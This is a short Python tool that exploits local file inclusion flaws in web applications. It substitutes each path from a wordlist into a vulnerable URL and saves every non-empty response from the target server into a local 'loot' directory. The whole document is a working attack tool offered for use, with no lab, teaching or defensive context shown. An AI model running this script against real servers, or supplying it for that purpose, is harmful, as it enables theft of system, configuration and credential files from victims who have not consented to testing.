#!/bin/python

import requests
import re
import os.path
import argparse


parser = argparse.ArgumentParser(description='Grab files via LFI exploit.')
parser.add_argument('-u', '--url', required=True, type=str, dest='url', help='The URL with the LFI, including a {FUZZ} marker where the filename has to be placed.')
parser.add_argument('-w', '--wordlist', required=True, type=str, dest='file', help='The path to the wordlist file to use.')
parser.add_argument('-d', '--target-dir', required=True, type=str, dest='dir', help='The target directory to place loot files in.')
parser.add_argument('-r', required=False, action='store_true', help='Allow loot file recursion.')

args = parser.parse_args()
base_url = args.url
fuzzfile = args.file
loot_directory = os.path.realpath(args.dir)

if base_url.find("{FUZZ}")<0:
	print("URL must contain '{FUZZ}'.")
	exit()

f = open(fuzzfile, 'r')
lines = f.readlines()
f.close()

if not loot_directory.endswith("/"):
	loot_directory+="/"

for line in lines:
	line = line.replace("\n","")

	if args.r:

		lootfile = line
		while lootfile.startswith('/'):
			lootfile=lootfile[1:]
		lootfile = loot_directory + lootfile.replace('~','home')
		while lootfile.find('..')>-1:
			lootfile = lootfile.replace('..','dotdot')

		lootfile = os.path.realpath(lootfile)
		if lootfile.find(loot_directory) < 0:
			lootfile = loot_directory + re.sub("[\W]","_",line)

	else:
		lootfile = loot_directory + re.sub("[\W]","_",line)

	if os.path.exists(lootfile):
		continue

	url = base_url.replace("{FUZZ}", line)
	response = requests.get(url)
	if len(response.content) > 0:
		print(lootfile)

		directory = os.path.dirname(lootfile)
		if not os.path.exists(directory):
			os.makedirs(directory)

		textfile = open(lootfile, "wb")
		a = textfile.write(response.content)
		textfile.close()

